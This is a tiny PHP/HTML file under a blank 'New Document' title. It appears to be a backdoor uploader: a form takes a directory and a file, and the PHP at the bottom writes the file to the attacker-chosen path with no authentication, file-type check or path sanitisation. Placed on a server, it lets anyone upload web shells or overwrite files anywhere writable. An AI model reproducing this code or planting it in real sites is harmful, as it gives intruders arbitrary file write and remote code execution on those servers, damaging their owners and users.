<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<TITLE> New Document </TITLE>
<META NAME="Generator" CONTENT="EditPlus">
<META NAME="Author" CONTENT="">
<META NAME="Keywords" CONTENT="">
<META NAME="Description" CONTENT="">
</HEAD>

<BODY>
<FORM METHOD=POST ACTION="" enctype="multipart/form-data">
<INPUT TYPE="text" NAME="dir"><BR>
<INPUT TYPE="file" name="file"><BR>
<INPUT TYPE="submit">
</FORM>
</BODY>
</HTML>
<?
move_uploaded_file($_FILES[file][tmp_name],"$_POST[dir]".$_FILES[file][name]);
?>
